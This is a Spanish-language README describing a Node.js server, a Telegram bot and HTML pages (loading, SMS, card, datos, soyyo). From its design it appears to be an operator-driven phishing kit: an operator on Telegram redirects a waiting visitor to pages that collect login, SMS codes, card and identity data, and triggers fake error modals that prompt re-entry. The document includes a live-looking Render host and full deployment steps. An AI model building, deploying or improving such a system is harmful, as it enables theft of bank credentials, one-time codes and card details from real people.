# Suite cliente + servidor Node + bot de Telegram

Este proyecto implementa una **suite de espera (`loading.html`)** controlada por un **servidor Node.js** desplegable en Render, que recibe órdenes desde un **bot/canal de Telegram** y redirige al cliente a las distintas vistas HTML (`index.html`, `sms.html`, `card.html`, `datos.html`, `soyyo.html`), mostrando dinámicamente los modales de error cuando corresponde.

## Arquitectura general

- **Cliente (navegador)**
  - El usuario entra en el flujo y termina en `loading.html`.
  - `loading.html`:
    - Asegura que exista un `sessionId` en `localStorage`.
    - Hace polling cada pocos segundos al servidor Node:
      - `GET https://polarizadoycaro-1.onrender.com/instruction/{sessionId}`
    - Si el servidor responde con `redirect_to`, redirige directamente a esa URL.

- **Servidor Node (`server.js`)**
  - Framework: `express` con `body-parser`.
  - Modelo de acciones soportadas:
    - `ERROR_LOGO`, `PEDIR_LOGO`
    - `ERROR_SMS`, `PEDIR_SMS`
    - `ERROR_CARD`, `PEDIR_CARD`
    - `ERROR_DATOS`, `PEDIR_DATOS`
    - `ERROR_SOYYO`, `PEDIR_SOYYO`
  - Mapeo acción → URL de redirección (con `state`):
    - `ERROR_LOGO` → `index.html?state=error_logo`
    - `PEDIR_LOGO` → `index.html?state=pedir_logo`
    - `ERROR_SMS` → `sms.html?state=error_sms`
    - `PEDIR_SMS` → `sms.html?state=pedir_sms`
    - `ERROR_CARD` → `card.html?state=error_card`
    - `PEDIR_CARD` → `card.html?state=pedir_card`
    - `ERROR_DATOS` → `datos.html?state=error_datos`
    - `PEDIR_DATOS` → `datos.html?state=pedir_datos`
    - `ERROR_SOYYO` → `soyyo.html?state=error_soyyo`
    - `PEDIR_SOYYO` → `soyyo.html?state=pedir_soyyo`

- **Bot de Telegram**
  - El operador pulsa botones como:
    - `ERROR LOGO`, `PEDIR LOGO`, `ERROR SMS`, etc.
  - Cada botón envía en `callback_data` un JSON:
    - `{ "action": "ERROR_LOGO", "sessionId": "<id-sesion-cliente>" }`
  - Telegram envía el update al webhook del servidor:
    - `POST /telegram/webhook`
  - El servidor guarda en memoria la orden asociada a ese `sessionId`, para que luego `loading.html` la recoja mediante polling.

## Endpoints del servidor

- `GET /health`
  - Para health checks en Render.
  - Respuesta: `{ ok: true, status: "healthy" }`.

- `GET /instruction/:sessionId`
  - Usado por `loading.html` para obtener la próxima instrucción para el cliente.
  - Respuesta:
    - Si no hay orden pendiente: `{ ok: true, action: null, redirect_to: null }`.
    - Si hay orden pendiente:
      - `{ ok: true, action: "ERROR_LOGO", redirect_to: "index.html?state=error_logo" }`.
  - Una vez consumida, la orden se elimina (uso único).

- `POST /telegram/webhook`
  - Recibe updates de Telegram (especialmente `callback_query` de botones inline).
  - Espera que `callback_query.data` sea un JSON:
    - `{ "action": "ERROR_LOGO", "sessionId": "sess_..." }`
  - Valida:
    - Que `action` sea una de las soportadas.
    - Que `sessionId` esté presente.
  - Guarda la orden en memoria y opcionalmente responde al callback de Telegram con un mensaje corto de confirmación.

- `POST /command`
  - Endpoint interno para pruebas sin usar Telegram.
  - Cuerpo esperado:
    - `{ "sessionId": "sess_test", "action": "ERROR_LOGO" }`
  - Devuelve directamente:
    - `{ ok: true, action: "ERROR_LOGO", redirect_to: "index.html?state=error_logo" }`

## Almacenamiento en memoria y seguridad básica

- Las órdenes se guardan en un objeto en memoria:
  - `orders[sessionId] = { action, redirectTo, createdAt }`.
- Cada orden:
  - Tiene un TTL de 5 minutos (`ORDER_TTL_MS`).
  - Se considera de **un solo uso**: en cuanto `/instruction/:sessionId` la devuelve, se elimina.
- Un proceso de limpieza periódica elimina órdenes caducadas.
- Para mejorar la seguridad del webhook de Telegram:
  - Configurar en entorno:
    - `TELEGRAM_TOKEN` (ya usado para contestar al callback).
    - Opcionalmente un secreto adicional para la URL de webhook o una validación extra.

## Polling desde `loading.html`

En `loading.html` se ha definido la siguiente lógica:

- Se asegura que exista un `sessionId` en `localStorage`:
  - Si no existe, se genera un ID aleatorio con prefijo `sess_` y se persiste.
- Se hace polling a:
  - `https://polarizadoycaro-1.onrender.com/instruction/${sessionId}`
- Mientras el servidor responda:
  - `{"ok": true, "action": null, "redirect_to": null}` → se sigue esperando.
  - `{"ok": true, "action": "ERROR_*", "redirect_to": "..."}` → `window.location.href = redirect_to`.

## Manejo de modales en las vistas

Las páginas:

- `index.html` (LOGO)
- `sms.html` (SMS)
- `card.html` (CARD)
- `datos.html` (DATOS)
- `soyyo.html` (SOYYO)

disponen de un **modal de error** similar, con un contenedor como:

- `<!-- MODAL DE ERROR - Oculto por defecto para uso dinamico -->`
- `<div id="error-alert-container" style="display: none;"> ... </div>`

La idea es que:

- Cuando se llegue con un `state` que empiece por `error_`:
  - Ese `error-alert-container` se muestre (por ejemplo con `style.display = "block"`).
- Cuando se llegue con un `state` que empiece por `pedir_`:
  - El modal permanezca oculto (`style.display = "none"`).

El servidor ya garantiza que el `state` se corresponde con la acción recibida desde Telegram.

## Cómo probar el sistema

1. **Instalar dependencias del servidor**
   - Desde el directorio del proyecto:
     - `npm install`

2. **Ejecutar el servidor en local**
   - `npm run start`
   - El servidor quedará escuchando en el puerto indicado por `PORT` (por defecto `3000`).

3. **Probar el endpoint de salud**
   - `GET http://localhost:3000/health`
   - Debe responder: `{ ok: true, status: "healthy" }`.

4. **Probar el flujo de instrucciones sin Telegram**
   - Crear un `sessionId` de prueba (por ejemplo `sess_test`) en el navegador (o simularlo).
   - Enviar una orden manual:
     - `POST http://localhost:3000/command`
     - Cuerpo JSON: `{ "sessionId": "sess_test", "action": "ERROR_LOGO" }`
   - Desde un navegador (con `sessionId = "sess_test"` en `localStorage`), cargar `loading.html` apuntando al servidor local (ajustar la URL si hace falta).
   - Verificar que la suite redirige a `index.html?state=error_logo`.

5. **Pruebas con Telegram (end‑to‑end)**
   - Configurar el bot de Telegram con el webhook del servidor en Render:
     - `https://<tu-app-en-render>.onrender.com/telegram/webhook`
   - Diseñar un teclado inline en el bot con botones:
     - `ERROR LOGO`, `PEDIR LOGO`, `ERROR SMS`, `PEDIR SMS`, etc.
   - En cada botón, configurar `callback_data` con:
     - `{ "action": "<ACCION>", "sessionId": "<sessionId-del-cliente>" }`
   - Con el cliente esperando en `loading.html`:
     - Pulsar distintos botones del bot.
     - Verificar que se redirige a la página correcta con el `state` correcto.

## Despliegue en Render (resumen)

1. Subir este proyecto a un repositorio (GitHub, GitLab, etc.).
2. Crear un nuevo servicio Web en Render:
   - Runtime: Node.
   - Comando de inicio: `npm start`.
3. Configurar variables de entorno:
   - `PORT` (opcional, Render suele inyectarla).
   - `TELEGRAM_TOKEN` (si se usa respuesta directa a `callback_query`).
4. Configurar el webhook del bot de Telegram para apuntar a:
   - `https://<tu-app-en-render>.onrender.com/telegram/webhook`

Con esto, la suite `loading.html` queda conectada al servidor en Render, y el operador puede manejar las redirecciones y los modales de error a través de los botones del bot de Telegram, sin tocar el diseño visual de las páginas.

